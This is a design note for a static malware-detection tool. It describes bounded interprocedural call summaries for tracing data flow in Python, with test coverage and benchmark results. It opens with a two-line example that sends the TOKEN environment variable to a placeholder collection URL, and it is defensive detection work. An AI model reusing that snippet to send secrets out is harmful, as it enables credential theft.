# Bounded direct-call summaries

Status: implemented on 2026-08-14 as an additive MalIR v1 analysis feature.

## Research question

The original provenance pass was deliberately intraprocedural. That kept the
common path small, but it missed ordinary wrappers such as:

```python
def transmit(payload):
    requests.post("https://example.invalid/collect", data=payload)

transmit(os.getenv("TOKEN"))
```

The question was whether ITCS could recover these paths without adopting
whole-program data flow or an unrestricted call graph.

Two established design ideas frame the answer:

- CodeQL separates local data flow from more expensive global analysis and uses
  summary models to describe flow through functions and libraries:
  [Python data flow](https://codeql.github.com/docs/codeql-language-guides/analyzing-data-flow-in-python/),
  [custom library models](https://codeql.github.com/docs/codeql-language-guides/customizing-library-models-for-python/).
- IFDS gives a classic formulation of context-sensitive interprocedural
  data-flow over finite facts and valid call/return paths:
  [Reps, Horwitz, and Sagiv (1995)](https://doi.org/10.1145/199448.199462).

ITCS does not implement CodeQL global flow or a full IFDS solver. It borrows the
narrower principle that explicit call/return boundaries should be modeled and
bounded separately from local provenance.

## Implemented design

The second AST pass first collects functions defined directly in the module. A
call is eligible only when a bare callable name resolves to one unique,
unrebound top-level definition and is not shadowed by a lexical binding in the
current frame. Callable aliases, duplicate definitions, module rebinding, and
star imports are rejected rather than guessed. Async functions expand only
under an immediate `await`; generator bodies are not treated as running at
generator creation time.

| Property | Implemented rule |
|---|---|
| Callees | Unique, unrebound top-level functions; async functions only under immediate `await` |
| Excluded activation | Generator creation, unawaited coroutines, callable aliases, and ambiguous rebinding |
| Binding | Positional, positional-only, named, keyword-only, defaults, varargs, and kwargs |
| State | Fresh local environment and file-handle state per expansion |
| Returns | Merge provenance from encountered return expressions |
| Recursion | Active-call guard; conservatively preserve input provenance |
| Default call depth | 3 |
| Default expansions | 64 per file |
| Existing trace bound | 16 traces per value, 16 real events per trace |
| Existing output bound | 256 behavior paths |
| Evidence | `summary:medium` when a path crosses a call boundary |
| Model token | Unchanged `MOTIF:<name>` token |

A private sentinel records that a trace crossed a summary boundary. It is
removed before public event indexes are emitted, so every reported index still
refers to a real MalIR event. Existing sparse and µMal checkpoints remain
schema-compatible because only path metadata changes.

The cheap candidate gate still avoids the second pass for ordinary files. It
uses the original same-callable source/sink check first. Only files containing a
statically resolved local call receive the broader file-level candidate check
needed to discover a split source and sink.

## Why the confidence tier is medium

A local `dataflow:high` path stays inside one analyzed callable. A
`summary:medium` path crosses an explicitly resolved call and binds arguments
to parameters, but it deliberately omits several Python semantics. Calling the
latter “high” would overstate what was proved.

The numeric motif policy is unchanged in this first implementation. Detector
aggregation treats a summary as causal evidence and suppresses a weaker
proximity duplicate. Both the default semantic aggregator and the retained
legacy baseline remove source and sink event scores covered by a summary,
preventing the new path from stacking with itself. The semantic default also
saturates repeated equivalent operations and motifs while reporting their
occurrence count. The report retains the medium qualitative tier. A future
weight change requires locked validation rather than an intuitive value.

## Deliberate limits

This pass does not claim to resolve:

- imported functions, methods, lambdas, nested functions, or callable aliases;
- generator iteration or async scheduling beyond an immediate `await`;
- object attributes, closures, globals, or nonlocal state;
- monkey patching, decorators, descriptors, or dynamic dispatch;
- exceptions or precise path feasibility;
- activation/reachability from a package entry point;
- behavior in another module.

When a recursion or expansion limit is reached, inputs are preserved
conservatively instead of being dropped. That favors recall and can add false
positives; the limit event is not presented as a proved callee execution path.

## Regression coverage

The implementation has counterexamples as well as positive paths:

- caller source to callee network sink;
- callee source returned to caller sink;
- a transform wrapper retaining its transform event;
- positional-only and keyword-only binding, including rejecting a keyword as
  the value of a positional-only parameter;
- positional and keyword-only defaults;
- explicit arguments overriding source-bearing defaults;
- constant-return functions killing unrelated argument provenance;
- lexical parameter/assignment shadowing blocking incorrect module resolution;
- duplicate definitions and module rebinding being rejected rather than guessed;
- awaited async calls expanding while unawaited coroutines and generators do not;
- recursive calls terminating under the configured bound;
- disabling expansion with a zero depth limit, including return passthrough
  without a false summary label.

These tests establish bounded implementation semantics, not malware-detection
accuracy.

A 21-repeat, 1,000-file synthetic ablation on the target 2-vCPU Codespace kept
local flow enabled in both modes. In the latest run, direct-call summaries
changed median latency from 1,287.35 to 1,298.90 ms (+0.90%), p95 from 1,472.37
to 1,468.30 ms (-0.28%), throughput from 770.33 to 750.89 files/s, and peak
Python allocation by +5.27%. The corpus intentionally placed a cross-function
candidate in 5% of files. An immediately preceding 21-repeat run measured
+3.30% median and +1.13% p95 overhead. The spread and negative latest p95
indicate host noise, not a speedup. Sequential mode order and `tracemalloc`
limit the claim; process RSS and interleaved runs remain open.

The next quality experiment should compare local-only and summary-enabled
variants on the same locked, group-disjoint real corpus and report changed
false positives and false negatives before changing the default evidence
weight. Reproduce the engineering ablation with
`itcs benchmark PATH --compare-summaries`.
